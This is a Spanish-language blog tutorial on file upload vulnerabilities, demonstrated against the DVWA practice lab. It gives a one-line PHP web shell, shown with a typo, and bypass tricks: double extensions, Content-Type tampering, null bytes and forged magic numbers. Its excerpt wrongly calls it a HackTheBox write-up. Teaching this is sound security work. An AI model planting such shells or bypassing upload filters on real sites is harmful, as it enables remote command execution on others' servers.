---
title: "File Upload"
layout: single
excerpt: Este es el "Write-Up" de la máquina **Armageddon** de la plataforma HackTheBox, maquina easy pero nunca esta demas compartir informacion, espero y les guste...  
header:
show_date: true
classes: wide
header:
  teaser: "/assets/images/File_Upload/File_upload.png"
  teaser_home_page: true
  icon: "/assets/images/File_Upload/File_upload.png"
categories:
  - Web Hacking
tags:
  - upload
  - hackweb


---

 ![](/assets/images/File_Upload/File_upload.png)  

Esta funcionalidad es esencial en casi todas las aplicaciones web permitiendo al usuario subir una foto, video, archivos de audio, CV , etc ...

Como siempre la subida de archivos es un riesgo notable en cualquier aplicacion web sino esta protegido correctamente esta funcionalidad.

Un hacker que tenga la hablidadad de hacer un bypass a esta funcioanlidad de la web podria  conseguir **Ejecución Remota de Comandos** `RCE`.

### 1.1 File Upload - básico

---

Creamos la shell 

```bash
echo '<?php system($_GET["cmd"]);?' >> test1.php
```

![](/assets/images/File_Upload/1.png)  

- Click `upload`

![](/assets/images/File_Upload/f2.png)  

- Accedemos a la url donde se guardo la shell

```http
http://localhost/DVWA/hackable/uploads/test1.php?c=pwd
```

![](/assets/images/File_Upload/f3.png)  

### 1.2 File Upload - extensión doble

---



Algunas aplicaciones web como medida de seguridad certifican la extension del archivo a subir. En otras palabras la subida de archivos está restringida a determinadas extensiones, no obstante,  en este caso veremos como añadiéndole una doble extensión hacemos un bypass.

```bash
mv test1.php tes1.php.png
```

![](/assets/images/File_Upload/f5.png)  

Interceptamos la petición con `Burpsuite` 

![](/assets/images/File_Upload/f6.png) 

- [x] Bypassed!

![](/assets/images/File_Upload/f2.png)

### 1.3 File Upload - content-type

---

Este tipo de restricción se encuentra en la cabecera http `Content-type` .Requiriendo manipular la petición.

![](/assets/images/File_Upload/f7.png)

### 1.4 File Upload - caracter hexadecimal nulo

---
Uno de los enfoques interesantes para cargar documentos permiciosos es utilizar caracteres de `bytes nulos` codificados en URL. El acceso no aprobado a los documentos del sistema podría obtenerse a través de dicha infusión de un byte no válido que da como resultado un `espacio en blanco` en la interpretación ASCII. La incrustación de un byte no válido conducirá a una aplicación web que utilice bibliotecas C / C ++ al verificar el nombre del registro o su contenido. Intentará engañar como si fuera el final de la cadena, y debería dejar de leer detenidamente en esta progresión.

Antes de cargar nuestro archivo PHP, hagamos un pequeño cambio y cambiemos el nombre.

```bash
mv  test1.php  test1.phpA.jpeg
```

- Interceptamos la peticion y la mandamos al `Decoder`

   ![](/assets/images/File_Upload/f9.png)

- El caracter `A`, el cual es el # 41 en `HEX` lo usaremos para identificarlo posteriormente en la petición.

El propósito es identificar rápidamente este caracter en el campo hexadecimal y cambiarlo al caracter nulo antes de enviar la solicitud. 

![](/assets/images/File_Upload/f8.png)

### 1.5 File Upload - números mágicos

---

Usualmente algunas web suelen validar las cabeceras hexadecimales  de la imagen más conocidos como números mágicos .Lógicamente sabiando esto se podría lograr un bypass.



| Extensiones | Cabeceras Hexadecimales |
| ----------- | :---------------------- |
| PNG         | 89 50 4E 47             |
| JPEG        | FF D8 FF E0 / FE        |
| PDF         | 25 50 44 46             |
| DOC         | D0 CF 11 E0             |

- Para cambiar las cabeceras hexadecimales utilizaremos el binario `hexeditor` 

 - Cambiando el `primer octeto` de bytes les quedaría así

   ![](/assets/images/File_Upload/f10.png)
   
   

Posteriormente la web interpretaría este `.php` como una imagen.